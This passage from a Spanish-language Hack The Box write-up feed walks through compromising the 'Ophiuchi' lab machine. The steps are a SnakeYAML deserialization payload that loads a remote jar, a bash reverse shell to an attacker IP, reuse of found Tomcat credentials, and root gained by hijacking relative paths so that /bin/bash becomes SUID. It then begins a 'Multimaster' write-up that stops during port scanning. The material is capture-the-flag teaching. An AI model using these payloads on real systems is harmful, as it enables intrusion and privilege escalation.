    public List&amp;lt;String&amp;gt; getExtensions() {
        return null;
    }

    @Override
    public List&amp;lt;String&amp;gt; getMimeTypes() {
        return null;
    }

    @Override
    public List&amp;lt;String&amp;gt; getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos en el script intentaremos al momento de realizar la desearializacion se ejecute una peticion que con &lt;code&gt;curl&lt;/code&gt; nos realize una peticion a un archivo el cual alojaremos een nuestra maquina y lo depositaremos en el directorio &lt;code&gt;tmp&lt;/code&gt; de la maquina victima con el nombre &lt;code&gt;reverse.sh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Seguidamente procederemos a crear un script en bash con el nombre &lt;code&gt;reverse.sh&lt;/code&gt; el cual al ejecutarse se encargara de ejecutarnos una peticion por el puerto &lt;code&gt;443&lt;/code&gt; para obtener una shell reversa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash


bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.4/443 0&amp;gt;&amp;amp;1

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemo a compilar &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; y esto nos genera un archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
manifiesto agregado
ignorando entrada META-INF/
agregando: META-INF/services/(entrada = 0) (salida = 0)(almacenado 0%)
agregando: META-INF/services/javax.script.ScriptEngineFactory(entrada = 36) (salida = 38)(desinflado -5%)
agregando: artsploit/(entrada = 0) (salida = 0)(almacenado 0%)
agregando: artsploit/AwesomeScriptEngineFactory.java(entrada = 1575) (salida = 420)(desinflado 73%)
agregando: artsploit/AwesomeScriptEngineFactory.class(entrada = 1678) (salida = 705)(desinflado 57%)

❯ ls
 src   README.md   yaml-payload.jar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;modificamos el codigo &lt;code&gt;YAML&lt;/code&gt; el cual insertaremos en la pagina &lt;code&gt;YAML Parser&lt;/code&gt;, para que realize una peticion a nuestra maquina en donde tendremos alojado el archivo &lt;code&gt;yaml-payload-jar&lt;/code&gt; y este a su vez nos ejecutara el codigo contenido que se encargara de realizar otra peticion a nuestro archivo &lt;code&gt;reverse.sh&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL [&quot;http://10.10.16.4/yaml-payload.jar&quot;]
  ]]
]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Montamos un servidor con &lt;code&gt;python&lt;/code&gt; en donde tenemos los dos archivos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 src   README.md   reverse.sh   yaml-payload.jar
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Enviamos la peticion:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y estamos dentro como el usuario &lt;code&gt;tomcat&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como siempre vamos a realizar el tratamiento de la &lt;code&gt;tty&lt;/code&gt; para obtener una full interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.227.
Ncat: Connection from 10.10.10.227:56610.
bash: cannot set terminal process group (796): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ophiuchi:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tomcat@ophiuchi:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
tomcat@ophiuchi:/$ export TERM=xterm
tomcat@ophiuchi:/$ export SHELL=bash
tomcat@ophiuchi:/$ stty rows 48 columns 184 #dependera del tamaño de tu pantalla &quot;ejecuta stty size&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos dirigimos al directorio &lt;code&gt;home&lt;/code&gt; y tratamos de leer la primera flag &lt;code&gt;user.txt&lt;/code&gt; pero vemos que no tenemos acceso:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tomcat@ophiuchi:/$ cd /home
tomcat@ophiuchi:/home$ ls
admin
tomcat@ophiuchi:/home$ cd admin/
tomcat@ophiuchi:/home/admin$ ls
user.txt
tomcat@ophiuchi:/home/admin$ cat user.txt 
cat: user.txt: Permission denied
tomcat@ophiuchi:/home/admin$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos que somos &lt;code&gt;tomcat&lt;/code&gt;, si recordamos su estructura sabemos que existe un archivo llamado &lt;code&gt;tomcat-users.xml&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tomcat@ophiuchi:/home/admin$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat@ophiuchi:/home/admin$ find / -name tomcat-users.xml 2&amp;gt;/dev/null
/opt/tomcat/conf/tomcat-users.xml
tomcat@ophiuchi:/home/admin$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto lo encontramos, ahora procedemos a leerlo y si efectivamente encontramos una credencial que corresponde al usuario &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
	version=&quot;1.0&quot;&amp;gt;
&amp;lt;user username=&quot;admin&quot; password=&quot;whythereisalimit&quot; roles=&quot;manager-gui,admin-gui&quot;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Procedemos esa contraseña con el usuario &lt;code&gt;admin&lt;/code&gt; y bingo!, somos el usuario ‘admin’ y ahora si podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tomcat@ophiuchi:/home/admin$ su admin
Password: 
admin@ophiuchi:~$ whoami
admin
admin@ophiuchi:~$ cat user.txt 
330298484fe5a40840ac52e730fb7f15
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora anteriormente vimos en la fase de reconocimiento que el puerto &lt;code&gt;22&lt;/code&gt; estaba abierto, asi que por que no probemos a conectarnos por &lt;code&gt;ssh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sshpass -p 'whythereisalimit' ssh admin@10.10.10.227
❯ ssh admin@10.10.10.227
The authenticity of host '10.10.10.227 (10.10.10.227)' can't be established.
ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.227' (ECDSA) to the list of known hosts.
admin@10.10.10.227's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ejecutamos el comando &lt;code&gt;id&lt;/code&gt; para ver a que grupos pertenecemos y despues ejecutamos el comado &lt;code&gt;sudo -l&lt;/code&gt;, para ver si podemos ejecutar un comando como usuario privilegiado ya que somos el usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
admin@ophiuchi:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ejecutar un programa llamado &lt;code&gt;index.go&lt;/code&gt; usando el binario &lt;code&gt;/usr/bin/go&lt;/code&gt; como &lt;code&gt;root&lt;/code&gt; vale?&lt;/p&gt;

&lt;p&gt;Veremos como podemos aprovecharnos de esto para escalar privilegios.&lt;/p&gt;

&lt;p&gt;Nos dirigimos a la ruta donde se encuentra el archivo index.go.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:~$ cd /opt/wasm-functions/
admin@ophiuchi:/opt/wasm-functions$ ls
backup  deploy.sh  index  index.go  main.wasm
admin@ophiuchi:/opt/wasm-functions$ ls -la
total 3928
drwxr-xr-x 3 root root    4096 Oct 14  2020 .
drwxr-xr-x 5 root root    4096 Oct 14  2020 ..
drwxr-xr-x 2 root root    4096 Oct 14  2020 backup
-rw-r--r-- 1 root root      88 Oct 14  2020 deploy.sh
-rwxr-xr-x 1 root root 2516736 Oct 14  2020 index
-rw-rw-r-- 1 root root     522 Oct 14  2020 index.go
-rwxrwxr-x 1 root root 1479371 Oct 14  2020 main.wasm
admin@ophiuchi:/opt/wasm-functions$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos el codigo del archivo &lt;code&gt;ìndex.go&lt;/code&gt; el cual podemos ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;package main

import (
	&quot;fmt&quot;
	wasm &quot;github.com/wasmerio/wasmer-go/wasmer&quot;
	&quot;os/exec&quot;
	&quot;log&quot;
)


func main() {
	bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;)

	instance, _ := wasm.NewInstance(bytes)
	defer instance.Close()
	init := instance.Exports[&quot;info&quot;]
	result,_ := init()
	f := result.String()
	if (f != &quot;1&quot;) {
		fmt.Println(&quot;Not ready to deploy&quot;)
	} else {
		fmt.Println(&quot;Ready to deploy&quot;)
		out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al ejecutar el &lt;code&gt;index.go&lt;/code&gt; vemos el mensaje &lt;code&gt;Not ready to deploy&lt;/code&gt; el cual seria un problema por que al depender del directorio actual en el que este para ejecutarse, puedo secuestrar el archivo ‘main.wasm’&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/opt/wasm-functions$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
admin@ophiuchi:/opt/wasm-functions$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Volvemos a leer el script y vemos que hay una variable &lt;code&gt;f&lt;/code&gt; que es diferente de &lt;code&gt;1&lt;/code&gt;, y vemos que de ser lo contrario se daria la otra condicion que nos ejecutaria el &lt;code&gt;deploy.sh&lt;/code&gt;, el cual podriamos tratar de manipular.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;package main

import (
	&quot;fmt&quot;
	wasm &quot;github.com/wasmerio/wasmer-go/wasmer&quot;
	&quot;os/exec&quot;
	&quot;log&quot;
)


func main() {
	bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;)

	instance, _ := wasm.NewInstance(bytes)
	defer instance.Close()
	init := instance.Exports[&quot;info&quot;]
	result,_ := init()
	f := result.String()
	if (f != &quot;1&quot;) {
		fmt.Println(&quot;Not ready to deploy&quot;)
	} else {
		fmt.Println(&quot;Ready to deploy&quot;)
		out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver si tenemos permiso de modificar el archivo &lt;code&gt;deploy.sh&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
#!/bin/bash

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
admin@ophiuchi:/opt/wasm-functions$ ls -l deploy.sh 
-rw-r--r-- 1 root root 88 Oct 14  2020 deploy.sh
admin@ophiuchi:/opt/wasm-functions$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Despues de ver los permisos que tenemos sobre el archivo, sabemos que no podemos modificarlo pero vimos anteriormente que el script &lt;code&gt;ìndex.go&lt;/code&gt; nos ejecuta el &lt;code&gt;deploy.sh&lt;/code&gt; de forma relativa, interesante; entonces yo podria crearme en el directorio &lt;code&gt;tmp&lt;/code&gt; mi propio archivo &lt;code&gt;deploy.sh&lt;/code&gt; y copiarme el &lt;code&gt;main.wasm&lt;/code&gt; ya que me los va a pillar desde alli y se podria tensa la cosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/opt/wasm-functions$ cd /tmp
admin@ophiuchi:/tmp$ cp /opt/
tomcat/         wasm-functions/ wasmer-go/      
admin@ophiuchi:/tmp$ cp /opt/wasm-functions/main.wasm .
admin@ophiuchi:/tmp$ touch deploy.sh
admin@ophiuchi:/tmp$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;En &lt;code&gt;deploy.sh&lt;/code&gt; lo que voy a intentar hacer es que este script me asigne una &lt;code&gt;suid&lt;/code&gt; a la &lt;code&gt;bash&lt;/code&gt;, para que como cualquier usuario en el sistema pueda spamear una consola como el propietario de forma temporal.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

chmod 4755 /bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y si intentamos ejecutar nuevamente el &lt;code&gt;index.go&lt;/code&gt; vemos que nuevamente nos sale.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces quiero pensar que en el archivo &lt;code&gt;main.wasm&lt;/code&gt; del &lt;code&gt;index.go&lt;/code&gt; debe existir una condicional que hace que la variable &lt;code&gt;f&lt;/code&gt; no sea igual a &lt;code&gt;1&lt;/code&gt; y por ese motivo no entra a la condicion que me ejecute el &lt;code&gt;deploy.sh&lt;/code&gt;, pero si tratamos de leer el &lt;code&gt;main.wasm&lt;/code&gt; no podriamos por que no es de un formato legible.&lt;/p&gt;

&lt;p&gt;La idea seria convertir el archivo &lt;code&gt;main.wasm&lt;/code&gt; a un formato textual y hacer poder intentar alterar los valores, para ello podemos usar una herramienta disponible en github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/WebAssembly/wabt&quot;&gt;https://github.com/WebAssembly/wabt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como la maquina tiene &lt;code&gt;python3&lt;/code&gt; vamos a abrir un servidor web por el puerto &lt;code&gt;8000&lt;/code&gt; para traernos el archivo &lt;code&gt;main.wasm&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ which python3
/usr/bin/python3
admin@ophiuchi:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.16.4 - - [25/Mar/2023 01:21:42] &quot;GET /main.wasm HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;wget http://10.10.10.227:8000/main.wasm
--2023-03-25 01:21:43--  http://10.10.10.227:8000/main.wasm
Conectando con 10.10.10.227:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1479371 (1,4M) [application/wasm]
Grabando a: «main.wasm»

main.wasm              100%[=========================&amp;gt;]   1,41M   276KB/s    en 7,4s    

2023-03-25 01:21:51 (195 KB/s) - «main.wasm» guardado [1479371/1479371]

❯ ls
 yaml-payload   2021-07-03-ophiuchi.md   main.wasm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora usando la herramienta previamente instalada haremos uso de &lt;code&gt;wasm2wat&lt;/code&gt; sobre el archivo &lt;code&gt;main.wasm&lt;/code&gt; y lo exportaremos como &lt;code&gt;main.wat&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 yaml-payload   2021-07-03-ophiuchi.md   main.wasm
❯ cat main.wat
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export &quot;memory&quot; (memory 0))
  (export &quot;info&quot; (func $info))
  (export &quot;__data_end&quot; (global 1))
  (export &quot;__heap_base&quot; (global 2)))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al leer el archivo vemos que hay una constante declarada con el valor de 0 &lt;code&gt;i32.const 0)&lt;/code&gt; la cual genera el problema por el cual el &lt;code&gt;index.go&lt;/code&gt; no nos puede ejecutar el &lt;code&gt;deploy.sh&lt;/code&gt;, asi que la modificaremos esa variable y le pondremos el valor de &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export &quot;memory&quot; (memory 0))
  (export &quot;info&quot; (func $info))
  (export &quot;__data_end&quot; (global 1))
  (export &quot;__heap_base&quot; (global 2)))

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez modificada debemos volver a generar un archivo &lt;code&gt;main.wasm&lt;/code&gt;, el cual lo haremos con &lt;code&gt;wat2wasm&lt;/code&gt; y lo subimos a la maquina victima compartiendonos un servicio con &lt;code&gt;python&lt;/code&gt;no sin antes borrar el &lt;code&gt;main.wasm&lt;/code&gt; de antes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /opt/wabt/build/wat2wasm main.wat &amp;gt; main.wasm
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ rm main.wasm 
admin@ophiuchi:/tmp$ wget http://10.10.16.4/main.wasm
--2023-03-25 01:34:51--  http://10.10.16.4/main.wasm
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112 [application/wasm]
Saving to: ‘main.wasm’

main.wasm             100%[=========================&amp;gt;]     112  --.-KB/s    in 0s

2023-03-25 01:34:52 (23.2 MB/s) - ‘main.wasm’ saved [112/112]

admin@ophiuchi:/tmp$ ls
deploy.sh
hsperfdata_tomcat
main.wasm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Teniendo los archivos volvemos a ejecutar el &lt;code&gt;index.go&lt;/code&gt; con el privilegio asignado y&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos lo ejecuta correctamente, entonces nos ejecuto el &lt;code&gt;deploy.sh&lt;/code&gt; veamos si es cierto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ ls -ls /bin/bash
1156 -rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y poom! ahora la bash es &lt;code&gt;suid&lt;/code&gt; solo debemos ejecutar ahora el comando &lt;code&gt;bash -p&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; y habriamos comprometido completamente el sistema :).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
0a7279e90650d908863ec8e8155efb52
bash-5.0#
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Fri, 24 Mar 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Ophiuchi</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Ophiuchi</guid>
        
        <category>yaml parser</category>
        
        <category>java deserealization</category>
        
        <category>tomcat explotation</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Multimaster - htb writeup</title>
        <description>&lt;p&gt;Hola de nuevo el de hoy vamos a estar resolviendo la maquina &lt;code&gt;Multimaster&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Insane&lt;/code&gt;, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por &lt;code&gt;smb&lt;/code&gt;, despues usaremos &lt;code&gt;wfuzz&lt;/code&gt; para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una &lt;code&gt;sql injection&lt;/code&gt; avanzada para hacer bypass un &lt;code&gt;waf&lt;/code&gt; incorporado en la maquina, obtendremos los &lt;code&gt;RID Y SID&lt;/code&gt; de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de &lt;code&gt;Visual Studio Code&lt;/code&gt; que por medio de la exposicion &lt;code&gt;debugger&lt;/code&gt; lograremos obtener &lt;code&gt;RCE&lt;/code&gt;, finalmente usaremos BoodHound donde setearemos &lt;code&gt;kerberos dont require preauthetication&lt;/code&gt; a un usuario miembro del grupo &lt;code&gt;Server Operators&lt;/code&gt; y manipulando el binPath nos convertiremos en el usuario Administrator.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Multimaster
❯ ls
 Multimaster
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.179
PING 10.10.10.179 (10.10.10.179) 56(84) bytes of data.
64 bytes from 10.10.10.179: icmp_seq=1 ttl=127 time=117 ms

--- 10.10.10.179 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 116.535/116.535/116.535/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que recibimos respuesta y que el ttl es igual a 127 correspondiente a una maquina windowns, seguidamente procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.179 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 15:32 GMT
Initiating SYN Stealth Scan at 15:32
Scanning 10.10.10.179 [65535 ports]
Discovered open port 135/tcp on 10.10.10.179
Discovered open port 53/tcp on 10.10.10.179
Discovered open port 445/tcp on 10.10.10.179
Discovered open port 3389/tcp on 10.10.10.179
Discovered open port 80/tcp on 10.10.10.179
Discovered open port 139/tcp on 10.10.10.179
Discovered open port 3269/tcp on 10.10.10.179
Discovered open port 389/tcp on 10.10.10.179
Discovered open port 9389/tcp on 10.10.10.179
Discovered open port 49698/tcp on 10.10.10.179
Discovered open port 49667/tcp on 10.10.10.179
Discovered open port 3268/tcp on 10.10.10.179
Discovered open port 49675/tcp on 10.10.10.179
Discovered open port 49674/tcp on 10.10.10.179
Discovered open port 49681/tcp on 10.10.10.179
Discovered open port 88/tcp on 10.10.10.179
Discovered open port 5985/tcp on 10.10.10.179
Discovered open port 593/tcp on 10.10.10.179
Discovered open port 49666/tcp on 10.10.10.179
Discovered open port 636/tcp on 10.10.10.179
Discovered open port 464/tcp on 10.10.10.179
Completed SYN Stealth Scan at 15:32, 41.87s elapsed (65535 total ports)
Nmap scan report for 10.10.10.179
Host is up, received user-set (0.24s latency).
Scanned at 2023-03-31 15:32:09 GMT for 41s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
